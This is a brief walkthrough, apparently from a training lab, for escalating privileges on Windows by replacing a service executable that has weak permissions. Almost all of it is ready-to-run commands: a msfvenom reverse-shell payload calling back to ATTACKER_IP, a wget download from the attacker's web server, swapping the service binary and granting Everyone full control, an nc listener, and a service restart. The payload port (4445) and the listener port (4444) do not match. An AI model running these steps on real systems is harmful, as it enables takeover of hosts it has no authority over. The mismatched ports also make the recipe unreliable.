If the executable associated with a service has weak permissions that allows an attacker to modify or replace it.

**Query the service configuration**
```
sc qc WindowsScheduler
```
Once the executable associated with the service is found, move on to check the permission of that executable.

**Check the Permission of the Executable**
```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

**Create a Payload**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

**Send it using the Python Webserver**
```
# Attacker
python3 -m http.server

# Victim
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

**Replace the Service Executable with our Payload**
```
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

**Start a reverse listener**
```
nc -nvlp 4444
```

**Restart the Service**
```
sc stop windowsscheduler
sc start windowsscheduler
```